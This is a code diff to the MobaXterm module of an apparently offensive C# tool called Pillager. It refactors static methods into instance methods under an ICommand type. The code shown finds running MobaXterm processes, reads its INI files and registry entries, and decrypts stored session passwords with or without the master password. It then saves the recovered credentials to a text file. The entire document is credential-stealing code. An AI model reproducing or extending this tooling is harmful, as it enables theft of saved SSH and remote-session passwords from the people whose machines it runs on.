@@ -10,11 +10,9 @@ using Pillager.Helper;
 
 namespace Pillager.Tools
 {
-    internal class MobaXterm
+    internal class MobaXterm : ICommand
     {
-        public static string ToolName = "MobaXterm";
-
-        public static string FromINI(List<string> pathlist)
+        public string FromINI(List<string> pathlist)
         {
             StringBuilder stringBuilder = new StringBuilder();
             foreach (var path in pathlist)
@@ -102,7 +100,7 @@ namespace Pillager.Tools
             return stringBuilder.ToString();
         }
 
-        public static string FromRegistry()
+        public string FromRegistry()
         {
             StringBuilder stringBuilder = new StringBuilder();
             List<string> passwordlist = new List<string>();
@@ -188,7 +186,7 @@ namespace Pillager.Tools
             return null;
         }
 
-        public static string DecryptWithMP(string SessionP, string Sesspasses, string Ciphertext)
+        public string DecryptWithMP(string SessionP, string Sesspasses, string Ciphertext)
         {
             byte[] bytes = Convert.FromBase64String(Sesspasses);
             //byte[] key = KeyCrafter(SessionP);
@@ -219,7 +217,7 @@ namespace Pillager.Tools
             return t1;
         }
 
-        public static string DecryptWithoutMP(string SessionP, string Ciphertext)
+        public string DecryptWithoutMP(string SessionP, string Ciphertext)
         {
             byte[] key = KeyCrafter(SessionP);
             byte[] text = Encoding.ASCII.GetBytes(Ciphertext);
@@ -252,7 +250,7 @@ namespace Pillager.Tools
             return "";
         }
 
-        public static byte[] RightBytes(byte[] input)
+        public byte[] RightBytes(byte[] input)
         {
             byte[] bytes = new byte[input.Length];
             for (int i = 0; i < input.Length-1; i++)
@@ -263,12 +261,12 @@ namespace Pillager.Tools
             return bytes;
         }
 
-        public static List<string> GetINI()
+        public List<string> GetINI()
         {
             List<string> pathlist = new List<string>();
             foreach (var process in Process.GetProcesses())
             {
-                if (process.ProcessName.Contains(ToolName))
+                if (process.ProcessName.Contains("MobaXterm"))
                 {
                     try
                     {
@@ -282,7 +280,7 @@ namespace Pillager.Tools
             return pathlist;
         }
 
-        private static string AESDecrypt(byte[] encryptedBytes, byte[] bKey, byte[] iv)
+        private string AESDecrypt(byte[] encryptedBytes, byte[] bKey, byte[] iv)
         {
             MemoryStream mStream = new MemoryStream(encryptedBytes);
             RijndaelManaged aes = new RijndaelManaged();
@@ -308,7 +306,7 @@ namespace Pillager.Tools
             }
         }
 
-        private static byte[] AESEncrypt(byte[] plainBytes, byte[] bKey)
+        private byte[] AESEncrypt(byte[] plainBytes, byte[] bKey)
         {
             MemoryStream mStream = new MemoryStream();
             RijndaelManaged aes = new RijndaelManaged();
@@ -331,7 +329,7 @@ namespace Pillager.Tools
             }
         }
 
-        public static byte[] KeyCrafter(string SessionP)
+        public byte[] KeyCrafter(string SessionP)
         {
             while (SessionP.Length < 20)
             {
@@ -357,18 +355,18 @@ namespace Pillager.Tools
             return key;
         }
 
-        public static void Save(string path)
+        public override void Save(string path)
         {
             try
             {
                 List<string> pathlist=GetINI();
                 if (pathlist.Count==0) return;
-                string savepath = Path.Combine(path, ToolName);
+                string savepath = Path.Combine(path, "MobaXterm");
                 Directory.CreateDirectory(savepath);
                 string registryout = FromRegistry();
                 string iniout = FromINI(pathlist);
                 string output = registryout + iniout;
-                if (!string.IsNullOrEmpty(output)) File.WriteAllText(Path.Combine(savepath, ToolName + ".txt"), output);
+                if (!string.IsNullOrEmpty(output)) File.WriteAllText(Path.Combine(savepath, "MobaXterm.txt"), output, Encoding.UTF8);
             }
             catch { }
         }
